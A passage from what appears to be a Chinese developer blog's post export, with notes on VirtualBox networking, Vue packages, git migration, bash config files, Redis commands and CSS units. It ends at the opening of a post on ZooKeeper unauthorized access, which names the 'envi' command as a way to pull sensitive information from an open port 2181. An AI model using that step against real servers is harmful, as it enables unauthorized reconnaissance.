步骤3在需要开启双网卡的虚拟操作系统中，进入设置 -&gt; 网络，开启两张网卡。
下图是我的配置，网卡 1 使用 NAT 网络模式，网卡 2 使用 Host-Only 模式

步骤4在 VirtualBox 中配置好以后，启动虚拟机，进入 CentOS 进行额外的配置。
使用 ifconfig 命令可以看到三张网卡：enp0s3、enp0s8、lo。
enp0s3 即启用了 NAT 网络模式的那张网卡，enp0s8 则是启用了 Host-Only 模式的网卡。

可以看到两张网卡都起来了，如果没起，使用命令 ifconfig enp0s3 up 启动网卡。
使用 service network status 可以查看网卡状态，可以看到 enp0s8 网卡缺少配置文件，需要自己配置。

添加网卡配置文件步骤：
一、使用 nmcli con 查看网卡 uuid

二、使用 ip addr 或者 ifconfig 查看网卡 mac 地址

三、将 /etc/sysconfig/network-scripts/ifcfg-enp0s3 拷贝一份，重命名成 ifcfg-enp0s8。然后修改 enp0s8 的网卡配置文件，修改完成以后，使用 systemctl restart network 重启网络使配置生效

在虚拟操作系统中改完网卡配置以后，查看网卡状态，并检查虚拟操作系统与外网、虚拟操作系统与宿主机之间的网络连接情况。


方案 2配置单网卡，网卡模式选择 Host-Only，宿主机网络共享给虚拟机的 Host-Only 网卡。

转载: https://zhuanlan.zhihu.com/p/341328334

]]></content>
      <tags>
        <tag>VirtualBox</tag>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue依赖包清单</title>
    <url>/2021/06/19/Vue%E4%BE%9D%E8%B5%96%E5%8C%85%E6%B8%85%E5%8D%95/</url>
    <content><![CDATA[axiosAxios 是一个基于 Promise 的 HTTP 客户端，用于 node.js 和浏览器。它是同构的（意思是它可以在具有相同代码库的浏览器和 nodejs 中运行）。在服务器端它使用原生 node.js http 模块，而在客户端（浏览器）它使用 XMLHttpRequests。
学习文档 https://axios-http.com/docs/intro
项目地址 https://github.com/axios/axios
ckeditor4可视化文本编辑器
官网 https://ckeditor.com/ckeditor-4/
文档 https://ckeditor.com/docs/ckeditor4/latest/guide/index.html
v-viewervue的图片查看器组件，支持旋转、缩放、缩放等，基于viewer.js
官方 https://mirari.cc/v-viewer/
项目地址 https://github.com/mirari/v-viewer
Viewer.js图片浏览
项目地址 https://github.com/fengyuanchen/viewerjs
lodash一个意在提高开发者效率,提高JS原生方法性能的JS库
学习文档 https://lodash.com.cn/
项目地址 https://github.com/lodash/lodash
JavaScript Standard StyleJavaScript 代码规范，自带 linter &amp; 代码自动修正
学习文档 https://standardjs.com/readme-zhcn.html
项目地址 https://github.com/standard/standard
]]></content>
      <tags>
        <tag>Vue</tag>
        <tag>依赖包</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10常用快捷键</title>
    <url>/2021/02/05/Windows10%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[窗口相关虚拟桌面Ctrl + Win + d    新建桌面Ctrl + Win + ←/→  左右切换桌面
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows卸载自带Flash</title>
    <url>/2021/02/02/Windows%E5%8D%B8%E8%BD%BD%E8%87%AA%E5%B8%A6Flash/</url>
    <content><![CDATA[参考该链接完成操作https://helpx.adobe.com/flash-player/kb/uninstall-flash-player-windows.html#main_Download_the_Adobe_Flash_Player_uninstaller
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>Flash</tag>
      </tags>
  </entry>
  <entry>
    <title>echarts案例汇总</title>
    <url>/2021/07/02/echarts%E6%A1%88%E4%BE%8B%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[同心圆
测试地址：https://echarts.apache.org/examples/zh/editor.html?c=pie-simple
var data &#x3D; [&#123;
        name: &quot;博士及以上&quot;,
        value: 0.2
    &#125;,
    &#123;
        name: &quot;硕士及以上&quot;,
        value: 0.3
    &#125;,
    &#123;
        name: &quot;本科及以上&quot;,
        value: 1
    &#125;,
    &#123;
        name: &quot;高中&quot;,
        value: 0.1
    &#125;,
    &#123;
        name: &quot;初中及以下&quot;,
        value: 0.1
    &#125;,
    &#123;
        name: &quot;其他&quot;,
        value: 0.8
    &#125;
];
var dataStyle &#x3D; &#123; 
    normal: &#123;
        label: &#123;show:false&#125;,
        labelLine: &#123;show:false&#125;,
        shadowBlur: 40,
        shadowColor: &#39;rgba(40, 40, 40, 0.5)&#39;,
    &#125;
&#125;;
var placeHolderStyle &#x3D; &#123;
    normal : &#123;
        color: &#39;rgba(0,0,0,0)&#39;,
        label: &#123;show:false&#125;,
        labelLine: &#123;show:false&#125;
    &#125;,
    emphasis : &#123;
        color: &#39;rgba(0,0,0,0)&#39;
    &#125;
&#125;;
var legendData&#x3D;[];
function getData(data) &#123;
    var sortData&#x3D;data.sort((a,b)&#x3D;&gt;&#123;
        return b.value-a.value
    &#125;);
    var res &#x3D; [];
    for (let i &#x3D; 0; i &lt; sortData.length; i++) &#123;
        legendData.push(sortData[i].name);
        res.push(&#123;
            type: &#39;pie&#39;,
            clockWise: false, &#x2F;&#x2F;顺时加载
            hoverAnimation: false, &#x2F;&#x2F;鼠标移入变大
            radius: [200 - i * 20, 220 - i * 20],　　　　　　　&#x2F;&#x2F;radius: [65 - i * 15 + &#39;%&#39;, 57 - i * 15 + &#39;%&#39;],
            itemStyle: dataStyle,
            data: [&#123;
                value: sortData[i].value,
                name: sortData[i].name
            &#125;, &#123;
                value: 1 - sortData[i].value,
                name:&#39;invisible&#39;,
                itemStyle: placeHolderStyle,
            &#125;]
        &#125;);
    &#125;
    return res;
&#125;
option &#x3D; &#123;
   backgroundColor: &#39;#f4f2e3&#39;,
    color: [&#39;#85b6b2&#39;, &#39;#6d4f8d&#39;,&#39;#cd5e7e&#39;, &#39;#e38980&#39;,&#39;#f7db88&#39;],
    tooltip : &#123;
        show: true,
        formatter: &quot;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)&quot;
    &#125;,
    legend: &#123;
        data:legendData,
        type: &#39;scroll&#39;,
        orient: &#39;vertical&#39;,
        align: &#39;left&#39;, &#x2F;&#x2F; 图例标记对其方式
        y: &#39;center&#39;,    &#x2F;&#x2F;延Y轴居中
        x: &#39;right&#39;, &#x2F;&#x2F;居右显示
        padding: 10, &#x2F;&#x2F;调节legend的位置
        formatter:  function(name)&#123;
            let total &#x3D; 0;
            let target;
            for (let i &#x3D; 0, l &#x3D; data.length; i &lt; l; i++) &#123;
            total +&#x3D; data[i].value;
            if (data[i].name &#x3D;&#x3D; name) &#123;
                target &#x3D; data[i].value;
                &#125;
            &#125;
            return name + &#39; &#39; + ((target&#x2F;total)*100).toFixed(0) + &#39;%&#39;;
        &#125;
    &#125;,
    toolbox: &#123;
        show : true,
        feature : &#123;
            saveAsImage : &#123;show: true&#125;
        &#125;
    &#125;,
    series : getData(data)
&#125;;
]]></content>
      <tags>
        <tag>echarts</tag>
      </tags>
  </entry>
  <entry>
    <title>git仓库目录迁移操作</title>
    <url>/2021/06/24/git%E4%BB%93%E5%BA%93%E7%9B%AE%E5%BD%95%E8%BF%81%E7%A7%BB%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[多个目录迁移到同一个新的仓库1、克隆需要迁移的项目代码
git clone git@gitlab.alibaba-inc.com:maru&#x2F;maru.git

2、同步所有分支信息
git branch -r | grep -v &#39;\-&gt;&#39; | while read remote; do git branch --track &quot;$&#123;remote#origin&#x2F;&#125;&quot; &quot;$remote&quot;; done

3、筛选出需要保留的目录
git filter-branch --index-filter &#39;git rm --cached -qr --ignore-unmatch -- . &amp;&amp; git reset -q $GIT_COMMIT -- src public&#39; --prune-empty -- --all

4、清理 .git 的 object
git reset --hard
git for-each-ref --format&#x3D;&quot;%(refname)&quot; refs&#x2F;original&#x2F; |xargs -n 1 git update-ref -d
git reflog expire --expire&#x3D;now --all
git gc --aggressive --prune&#x3D;now

5、设置 origin
git remote rm origin
git remote add origin xxx.git

6、推送
git push --all

单个目录迁移到新仓库只需要将上面的第三步改为下面的这条命令即可：
git filter-branch --tag-name-filter cat --prune-empty --subdirectory-filter src -- --all
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下的/etc/profile、/etc/bashrc、~/.bash_profile、~/.bashrc文件</title>
    <url>/2021/07/31/linux%E4%B8%8B%E7%9A%84profile%E3%80%81bashrc%E3%80%81bash_profile%E3%80%81bashrc%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[一、介绍/etc/profile此文件为系统的每个用户设置环境信息，当用户第一次登录时，该文件被执行。并从 /etc/profile.d 目录的配置文件中收集 shell 的设置。如果你有对 /etc/profile 有修改的话必须得 source 一下你的修改才会生效，此修改对每个用户都生效。
/etc/bashrc（ubuntu为 /etc/bash.bashrc）为每一个运行 bash shell 的用户执行此文件。当 bash shell 被打开时，该文件被读取。如果你想对所有的使用 bash 的用户修改某个配置并在以后打开的 bash 都生效的话可以修改这个文件，修改这个文件不用重启，重新打开一个 bash 即可生效。 Ubuntu没有此文件，与之对应的是/ect/bash.bashrc。
~/.bash_profile（ubuntu为 ~/.profile）每个用户都可使用该文件输入专用于自己使用的 shell 信息，当用户登录时，该文件仅仅执行一次！默认情况下,它设置一些环境变量，执行用户的~/ .bashrc 文件。 此文件类似于 /etc/profile，也是需要需要 source 才会生效，/etc/profile 对所有用户生效，~/.bash_profile 只对当前用户生效。~/.profile(由Bourne Shell和Korn Shell使用)和.login(由C Shell使用)两个文件是.bash_profile的同义词，目的是为了兼容其它Shell。




Linux的Shell种类众多，常见的有： Bourne Shell（/usr/bin/sh或/bin/sh）、 Bourne Again Shell（/bin/bash）、 C Shell（/usr/bin/csh）、 K Shell（/usr/bin/ksh）、 Shell for Root（/sbin/sh）等等。
不同的Shell语言的语法有所不同，所以不能交换使用。每种Shell都有其特色之处，基本上，掌握其中任何一种 就足够了。在本文中，我们关注的重点是Bash，也就是Bourne Again Shell，由于易用和免费，Bash在日常工作中被广泛使用；同时，Bash也是大多数Linux系统默认的Shell。
在一般情况下，人们并不区分 Bourne Shell和Bourne Again Shell，所以，在下面的文字中，我们可以看到#!/bin/sh，它同样也可以改为#!/bin/bash。


~/.bashrc该文件包含专用于你的 bash shell 的 bash 信息，当登录时以及每次打开新的 shell 时，该文件被读取。（每个用户都有一个 ~/.bashrc 文件，在用户目录下） 此文件类似于 /etc/bashrc，不需要重启就可以生效，重新打开一个 bash 即可生效，/etc/bashrc 对所有用户新打开的 bash 都生效，但 ~/.bashrc 只对当前用户新打开的 bash 生效。~/.bashrc 文件会在bash shell调用另一个bash shell时读取，也就是在shell中再键入bash命令启动一个新shell时就会去读该文件。这样可有效分离登录和子shell所需的环境。但一般 来说都会在/.bash_profile里调用~/.bashrc脚本以便统一配置用户环境。
~/.bash_logout:当每次退出系统(退出 bash shell)时，执行该文件。可把一些清理工作的命令放到这文件中。
二、区别和联系
在 /etc目录是系统级（全局）的配置文件，当在用户主目录下找不到 ~/.bash_profile 和~/.bashrc时，就会读取这两个文件。
/etc/profile 中设定的变量(全局)的可以作用于任何用户，而 ~/.bashrc 中设定的变量(局部)只能继承 /etc/profile 中的变量，他们是“父子”关系。
~/.bash_profile 是交互式、login 方式进入 bash 运行的； ~/.bashrc 是交互式 non-login 方式进入 bash 运行的。通常二者设置大致相同，所以通常前者会调用后者。设置生效：可以重启生效，也可以使用命令：source。
~/.bash_history 是bash shell的历史记录文件，里面记录了你在bash shell中输入的所有命令。可通过HISSIZE环境变量设置在历史记录文件里保存记录的条数。

三、执行顺序关于登录linux时，/etc/profile、~/.bash_profile等几个文件的执行过程。
① 在刚登录Linux时，
首先启动 /etc/profile 文件，
然后再启动用户目录下的 ~/.bash_profile、 ~/.bash_login 或 ~/.profile 文件中 的其中一个，执行的顺序为：~/.bash_profile、~/.bash_login、~/.profile


其中 ~/.bash_profile、~/.bash_login 和 ~/.profile 文件往往只存在一个，这与Linux的发行版本有关。centos中为 ~/.bash_profile，ubuntu则为 ~/.profile。


以上两个文件会在用户登录时执行。

② 下面开始执行用户的bash设置如果 ~/.bash_profile 文件存在的话，一般会以这样的方式执行用户的 ~/.bashrc 文件。 在 ~/.bash_profile 文件中一般会有下面的代码：
# .bash_profile
# Get the aliases and functions
if [ -f ~&#x2F;.bashrc ]; then
        . ~&#x2F;.bashrc
fi
# User specific environment and startup programs
PATH&#x3D;$PATH:$HOME&#x2F;bin
export PATH

同样 ~/.bashrc 中，一般还会在文件的前面有以下代码，来执行 /etc/bashrc。
# .bashrc
# User specific aliases and functions
alias rm&#x3D;&#39;rm -i&#39;
alias cp&#x3D;&#39;cp -i&#39;
alias mv&#x3D;&#39;mv -i&#39;
# Source global definitions
if [ -f &#x2F;etc&#x2F;bashrc ]; then
        . &#x2F;etc&#x2F;bashrc
fi

所以，~/.bashrc 会调用 /etc/bashrc 文件。最后，在退出shell时，还会执行 ~/.bash_logout 文件。

执行顺序为:

/etc/profile
~/.bash_profile | ~/.bash_login | ~/.profile
~/.bashrc
/etc/bashrc
~/.bash_logout


四、其他
图形模式登录时，顺序读取：/etc/profile和~/.profile
图形模式登录后，打开终端时，顺序读取：/etc/bash.bashrc和~/.bashrc
文本模式登录时，顺序读取：/etc/bash.bashrc，/etc/profile和~/.bash_profile
从其它用户su到该用户，则分两种情况： （1）如果带-l参数（或-参数，–login参数），如：su -l username，则bash是lonin的，它将顺序读取以下配置文件：/etc/bash.bashrc，/etc/profile和~ /.bash_profile。 （2）如果没有带-l参数，则bash是non-login的，它将顺序读取：/etc/bash.bashrc和~/.bashrc
注销时，或退出su登录的用户，如果是longin方式，那么bash会读取：~/.bash_logout
执行自定义的shell文件时，若使用“bash -l a.sh”的方式，则bash会读取行：/etc/profile和~/.bash_profile，若使用其它方式，如：bash a.sh， ./a.sh，sh a.sh（这个不属于bash shell），则不会读取上面的任何文件。


转载：https://www.jianshu.com/p/6d32b166f47d

]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>npm 和 yarn 的区别</title>
    <url>/2021/06/24/npm%E5%92%8Cyarn%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[两者都是基于同一个代码包数据库去拉取数据的。
最开始，yarn 是为了弥补 npm 的一些缺陷而出现的，到目前为止，两者的区别越来越小，主要是时间和使用体验上的一些不同了。
1、速度快
npm 第一次安装的对比 54.885s

yarn 第一次安装的对比 64.87s

npm 再次安装时间对比 34.961s

yarn 再次安装时间对比 19.824s

npm 删除包花费的时间对比 43.843s

yarn 删除包花费的时间对比 21.99s

2、npm 安装在国内基本都要设置镜像，而有些 npm 包需要额外的配置才能拉取下来
3、命令使用上，定义在 scripts 里面的命令，npm 需要加上 run，yarn 不需要
npm 和 yarn 常用命令# 安装依赖
npm i
yarn install

# 启动开发服务
npm run dev
yarn dev

# 打包项目
npm run build
yarn build

# 删除某个依赖
npm uninstall axios
yarn remove axios

# 新增某个依赖
npm install axios --save
yarn add axios

# 新增指定版本的依赖
npm i axios@0.19.2 --save
yarn add axios@0.19.2

]]></content>
      <tags>
        <tag>npm</tag>
        <tag>yarn</tag>
      </tags>
  </entry>
  <entry>
    <title>pt与px、em、rem的区别与换算</title>
    <url>/2021/07/04/pt%E4%B8%8Epx%E3%80%81em%E3%80%81rem%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E6%8D%A2%E7%AE%97/</url>
    <content><![CDATA[
DPI/pt/px 单位的含义 DPI(Dots Per Inch) 每英寸像素数。

DPI/pt/px 单位的含义DPI(Dots Per Inch)每英寸像素数。Windows 系统默认是 96dpi，Apple 系统默认是 72dpi。
pt (point，磅)是一个物理长度单位，指的是 72 分之一英寸。
px (pixel，像素)一个虚拟长度单位，是计算机系统的数字化图像长度单位，如果 px 要换算成物理长度，需要指定精度 DPI，在扫描打印时一般都有 DPI 可选。常见浏览器的默认字体大小都是 16px。
由于屏幕大小的差异性，相同大小的字体在不同屏幕下显示的效果差异比较大。那么动态的放大 / 缩小字体就变得比较重要。显然针对每一处的字体设置都去做兼容是复杂的，于是就有了后面的 em 和 rem。
em (相对长度)相对于当前对象内文本的字体尺寸。如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。
由于浏览器的默认字体大小是 16px，所以未经调整默认字体大小的浏览器都符合: 1em = 16px。
em 会继承父级元素的字体大小。由此，只需要改变父元素的字体大小，就可以同步放大或缩小子元素的字体。
但是也因此需要注意几点：
1、body 选择器中声明 Font-size=62.5% (10 ÷ 16 × 100% = 62.5%)；
2、将你的原来的 px 数值除以 10，然后换上 em 作为单位；
3、重新计算那些被放大的字体的 em 数值。避免字体大小的重复声明。
rem (font size of the root element)由于 em 存在对父元素继承的问题，当改变字体大小时涉及的继承关系就变得复杂起来。
rem 是相对于根元素 字体尺寸的大小。如 文本大小设为 font-size: 10px，则 1rem = 10px。使用 rem 设置字体则简单了很多。
px 与 pt 的换算px = pt * DPI / 72
像素与毫米的转换象素数 / DPI = 英寸数英寸数 * 25.4 = 毫米数
一英寸等于 25.4mm。那么毫米换算成像素的公式为：
水平方向的换算： x * px /25.4垂直方向的换算： y * py /25.4像素换算为毫米： x * 25.4 / px
pt/px/em/percent 换算参考以 Windows 下的 96dpi 作参考，则有：pt = px_72/96 = px_3/4。再考虑浏览器的默认字体大小是 16px，我们可以得到如下的换算参考：
html &#123;font-size: 62.5%;  &#x2F;*10 ÷ 16 × 100% &#x3D; 62.5%*&#x2F;&#125;
body &#123;font-size: 1.4rem; &#x2F;*1.4 × 10px &#x3D; 14px *&#x2F;&#125;
h1 &#123; font-size: 2.4rem;  &#x2F;*2.4 × 10px &#x3D; 24px*&#x2F;&#125;

一个经典的简单示例：
html &#123;font-size: 62.5%;  &#x2F;*10 ÷ 16 × 100% &#x3D; 62.5%*&#x2F;&#125;
body &#123;font-size: 1.4rem; &#x2F;*1.4 × 10px &#x3D; 14px *&#x2F;&#125;
h1 &#123; font-size: 2.4rem;  &#x2F;*2.4 × 10px &#x3D; 24px*&#x2F;&#125;


原文：https://lzw.me/a/pt-px-em-rem.html

]]></content>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>redis常用命令</title>
    <url>/2021/02/26/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[下面总结并演示了 Redis 的 常用管理命令、key 操作、字符串、集合、列表、散列类型的操作命令。


常用管理命令1、启动 Redis&gt; redis-server [--port 6379]

如果命令参数过多，建议通过配置文件来启动 Redis。
&gt; redis-server [xx&#x2F;xx&#x2F;redis.conf]

6379 是 Redis 默认端口号。
2、连接 Redis&gt; .&#x2F;redis-cli [-h 127.0.0.1 -p 6379]

3、停止 Redis&gt; redis-cli shutdown

&gt; kill redis-pid

以上两条停止 Redis 命令效果一样。
4、发送命令给 Redis 发送命令有两种方式：
1、redis-cli 带参数运行，如：&gt; redis-cli shutdown
not connected&gt;

这样默认是发送到本地的 6379 端口。
2、redis-cli 不带参数运行，如：&gt; .&#x2F;redis-cli

127.0.0.1:6379&gt; shutdown
not connected&gt;

5、测试连通性127.0.0.1:6379&gt; ping
PONG

key 操作命令获取所有键
语法：keys pattern  

127.0.0.1:6379&gt; keys *
1) &quot;javastack&quot;



表示通配符，表示任意字符，会遍历所有键显示所有的键列表，时间复杂度 O(n)，在生产环境不建议使用。



获取键总数
语法：dbsize  

127.0.0.1:6379&gt; dbsize
(integer) 6

获取键总数时不会遍历所有的键，直接获取内部变量，时间复杂度 O(1)。
查询键是否存在
语法：exists key [key ...]  

127.0.0.1:6379&gt; exists javastack java
(integer) 2

查询查询多个，返回存在的个数。
删除键
语法：del key [key ...]  

127.0.0.1:6379&gt; del java javastack
(integer) 1

可以删除多个，返回删除成功的个数。
查询键类型
语法： type key  

127.0.0.1:6379&gt; type javastack
string

移动键
语法：move key db  

如把 javastack 移到 2 号数据库。
127.0.0.1:6379&gt; move javastack 2
(integer) 1
127.0.0.1:6379&gt; select 2
OK
127.0.0.1:6379[2]&gt; keys *
1) &quot;javastack&quot;

查询 key 的生命周期（秒）
秒语法：ttl key毫秒语法：pttl key  

127.0.0.1:6379[2]&gt; ttl javastack
(integer) -1

-1：永远不过期。
设置过期时间
秒语法：expire key seconds毫秒语法：pexpire key milliseconds  

127.0.0.1:6379[2]&gt; expire javastack 60
(integer) 1
127.0.0.1:6379[2]&gt; ttl javastack
(integer) 55

设置永不过期
语法：persist key  

127.0.0.1:6379[2]&gt; persist javastack
(integer) 1

更改键名称
语法：rename key newkey  

127.0.0.1:6379[2]&gt; rename javastack javastack123
OK

字符串操作命令字符串是 Redis 中最基本的数据类型，单个数据能存储的最大空间是 512M。
存放键值
语法：set key value [EX seconds] [PX milliseconds] [NX|XX]  

nx：如果 key 不存在则建立，xx：如果 key 存在则修改其值，也可以直接使用 setnx/setex 命令。
127.0.0.1:6379&gt; set javastack 666
OK

获取键值
语法：get key  

127.0.0.1:6379[2]&gt; get javastack
&quot;666&quot;

值递增 / 递减如果字符串中的值是数字类型的，可以使用 incr 命令每次递增，不是数字类型则报错。

语法：incr key  

127.0.0.1:6379[2]&gt; incr javastack
(integer) 667

一次想递增 N 用 incrby 命令，如果是浮点型数据可以用 incrbyfloat 命令递增。
同样，递减使用 decr、decrby 命令。
批量存放键值
语法：mset key value [key value ...]  

127.0.0.1:6379[2]&gt; mset java1 1 java2 2 java3 3
OK

获取获取键值
语法：mget key [key ...]  

127.0.0.1:6379[2]&gt; mget java1 java2
1) &quot;1&quot;
2) &quot;2&quot;

Redis 接收的是 UTF-8 的编码，如果是中文一个汉字将占 3 位返回。
获取值长度
语法：strlen key127.0.0.1:6379[2]&gt; strlen javastack (integer) 3  

追加内容
语法：append key value  

127.0.0.1:6379[2]&gt; append javastack hi
(integer) 5

向键值尾部添加，如上命令执行后由 666 变成 666hi
获取部分字符
语法：getrange key start end  

&gt; 127.0.0.1:6379[2]&gt; getrange javastack 0 4
&quot;javas&quot;

集合操作命令集合类型和列表类型相似，只不过是集合是无序且不可重复的。
集合
存储值
语法：sadd key member [member ...]  

&#x2F;&#x2F; 这里有8个值（2个java），只存了7个
127.0.0.1:6379&gt; sadd langs java php c++ go ruby python kotlin java
(integer) 7

获取元素
获取所有元素语法：smembers key  

127.0.0.1:6379&gt; smembers langs
1) &quot;php&quot;
2) &quot;kotlin&quot;
3) &quot;c++&quot;
4) &quot;go&quot;
5) &quot;ruby&quot;
6) &quot;python&quot;
7) &quot;java&quot;


随机获取语法：srandmember langs count  

127.0.0.1:6379&gt; srandmember langs 3
1) &quot;c++&quot;
2) &quot;java&quot;
3) &quot;php&quot;

判断集合是否存在元素
语法：sismember key member  

127.0.0.1:6379&gt; sismember langs go
(integer) 1

获取集合元素个数
语法：scard key  

127.0.0.1:6379&gt; scard langs
(integer) 7

删除集合元素
语法：srem key member [member ...]  

127.0.0.1:6379&gt; srem langs ruby kotlin
(integer) 2

弹出元素
语法：spop key [count]  

127.0.0.1:6379&gt; spop langs 2
1) &quot;go&quot;
2) &quot;java&quot;

有序集合
和列表的区别：
1、列表使用链表实现，两头快，中间慢。有序集合是散列表和跳跃表实现的，即使读取中间的元素也比较快。
2、列表不能调整元素位置，有序集合能。
3、有序集合比列表更占内存。

存储值
语法：zadd key [NX|XX] [CH] [INCR] score member [score member ...]  

127.0.0.1:6379&gt; zadd footCounts 16011 tid 20082 huny 2893 nosy
(integer) 3

获取元素分数
语法：zscore key member  

127.0.0.1:6379&gt; zscore footCounts tid
&quot;16011&quot;


获取排名范围排名语法：zrange key start stop [WITHSCORES]  

&#x2F;&#x2F; 获取所有，没有分数
127.0.0.1:6379&gt; zrange footCounts 0 -1
1) &quot;nosy&quot;
2) &quot;tid&quot;
3) &quot;huny&quot;

&#x2F;&#x2F; 获取所有及分数
127.0.0.1:6379&gt; zrange footCounts 0 -1 Withscores
1) &quot;nosy&quot;
2) &quot;2893&quot;
3) &quot;tid&quot;
4) &quot;16011&quot;
5) &quot;huny&quot;
6) &quot;20082&quot;


获取指定分数范围排名语法：zrangebyscore key min max [WITHSCORES] [LIMIT offset count]  

127.0.0.1:6379&gt; zrangebyscore footCounts 3000 30000 withscores limit 0 1
1) &quot;tid&quot;
2) &quot;16011&quot;

增加指定元素分数
语法：zincrby key increment member  

127.0.0.1:6379&gt; zincrby footCounts 2000 tid
&quot;18011&quot;

获取集合元素个数
语法：zcard key  

127.0.0.1:6379&gt; zcard footCounts
(integer) 3

获取指定范围分数个数
语法：zcount key min max  

127.0.0.1:6379&gt; zcount footCounts 2000 20000
(integer) 2

删除指定元素
语法：zrem key member [member ...]  

127.0.0.1:6379&gt; zrem footCounts huny
(integer) 1

获取元素排名
语法：zrank key member  

127.0.0.1:6379&gt; zrank footCounts tid
(integer) 1

列表操作命令列表类型是一个有序的字段串列表，内部是使用双向链表实现，所有可以向两端操作元素，获取两端的数据速度快，通过索引到具体的行数比较慢。
列表类型的元素是有序且可以重复的。
存储值
左端存值语法：lpush key value [value ...]  

127.0.0.1:6379&gt; lpush list lily sandy
(integer) 2


右端存值语法：rpush key value [value ...]  

127.0.0.1:6379&gt; rpush list tom kitty
(integer) 4


索引存值语法：lset key index value  

127.0.0.1:6379&gt; lset list 3 uto
OK

弹出元素
左端弹出语法：lpop key  

127.0.0.1:6379&gt; lpop list
&quot;sandy&quot;


右端弹出语法：rpop key  

127.0.0.1:6379&gt; rpop list
&quot;kitty&quot;

获取元素个数
语法：llen key  

127.0.0.1:6379&gt; llen list
(integer) 2

获取列表元素
两边获取语法：lrange key start stop  

127.0.0.1:6379&gt; lpush users tom kitty land pony jack maddy
(integer) 6

127.0.0.1:6379&gt; lrange users 0 3
1) &quot;maddy&quot;
2) &quot;jack&quot;
3) &quot;pony&quot;
4) &quot;land&quot;

&#x2F;&#x2F; 获取所有
127.0.0.1:6379&gt; lrange users 0 -1
1) &quot;maddy&quot;
2) &quot;jack&quot;
3) &quot;pony&quot;
4) &quot;land&quot;
5) &quot;kitty&quot;
6) &quot;tom&quot;

&#x2F;&#x2F; 从右端索引
127.0.0.1:6379&gt; lrange users -3 -1
1) &quot;land&quot;
2) &quot;kitty&quot;
3) &quot;tom&quot;


索引获取语法：lindex key index  

127.0.0.1:6379&gt; lindex list 2
&quot;ketty&quot;

&#x2F;&#x2F; 从右端获取
127.0.0.1:6379&gt; lindex list -5
&quot;sady&quot;

删除元素
根据值删除语法：lrem key count value  

127.0.0.1:6379&gt; lpush userids 111 222 111 222 222 333 222 222
(integer) 8

&#x2F;&#x2F; count&#x3D;0 删除所有
127.0.0.1:6379&gt; lrem userids 0 111
(integer) 2

&#x2F;&#x2F; count &gt; 0 从左端删除前count个
127.0.0.1:6379&gt; lrem userids 3 222
(integer) 3

&#x2F;&#x2F; count &lt; 0 从右端删除前count个
127.0.0.1:6379&gt; lrem userids -3 222
(integer) 2


范围删除语法：ltrim key start stop  

&#x2F;&#x2F; 只保留2-4之间的元素
127.0.0.1:6379&gt; ltrim list 2 4
OK

散列操作命令redis 字符串类型键和值是字典结构形式，这里的散列类型其值也可以是字典结构。
存放键值
单个语法：hset key field value  

127.0.0.1:6379&gt; hset user name javastack
(integer) 1


多个语法：hmset key field value [field value ...]  

127.0.0.1:6379&gt; hmset user name javastack age 20 address china
OK


不存在时语法：hsetnx key field value  

127.0.0.1:6379&gt; hsetnx user tall 180
(integer) 0

获取字段值
单个语法：hget key field  

127.0.0.1:6379&gt; hget user age
&quot;20&quot;


多个语法：hmget key field [field ...]  

127.0.0.1:6379&gt; hmget user name age address
1) &quot;javastack&quot;
2) &quot;20&quot;
3) &quot;china&quot;


获取所有键与值语法：hgetall key  

127.0.0.1:6379&gt; hgetall user
1) &quot;name&quot;
2) &quot;javastack&quot;
3) &quot;age&quot;
4) &quot;20&quot;
5) &quot;address&quot;
6) &quot;china&quot;


获取所有字段语法：hkeys key  

127.0.0.1:6379&gt; hkeys user
1) &quot;name&quot;
2) &quot;address&quot;
3) &quot;tall&quot;
4) &quot;age&quot;


获取所有值语法：hvals key  

127.0.0.1:6379&gt; hvals user
1) &quot;javastack&quot;
2) &quot;china&quot;
3) &quot;170&quot;
4) &quot;20&quot;

判断字段是否存在
语法：hexists key field  

127.0.0.1:6379&gt; hexists user address
(integer) 1

获取字段数量
语法：hlen key  

127.0.0.1:6379&gt; hlen user
(integer) 4

递增 / 减
语法：hincrby key field increment  

127.0.0.1:6379&gt; hincrby user tall -10
(integer) 170

删除字段
语法：hdel key field [field ...]  

127.0.0.1:6379&gt; hdel user age
(integer) 1

都是基本的命令用法，不会用了就来翻一下吧！
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode插件</title>
    <url>/2021/07/03/vscode%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[VSCodeVimmarketplace https://marketplace.visualstudio.com/items?itemName=vscodevim.vimgithub      https://github.com/VSCodeVim/Vim
]]></content>
      <tags>
        <tag>vscode</tag>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title>vue页面开发思路</title>
    <url>/2021/06/26/vue%E9%A1%B5%E9%9D%A2%E5%BC%80%E5%8F%91%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>zookeeper未授权访问漏洞</title>
    <url>/2021/07/03/zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[
原文地址 https://www.jianshu.com/p/86a7f506d1d2

ZooKeeper 默认开启在 2181 端口，在未进行任何访问控制情况下，攻击者可通过执行 envi 命令获得系统大量的敏感信息，包括系统名称、Java 环境。
0x00 ZooKeeper 安装：Zookeeper 的默认开放端口是 2181
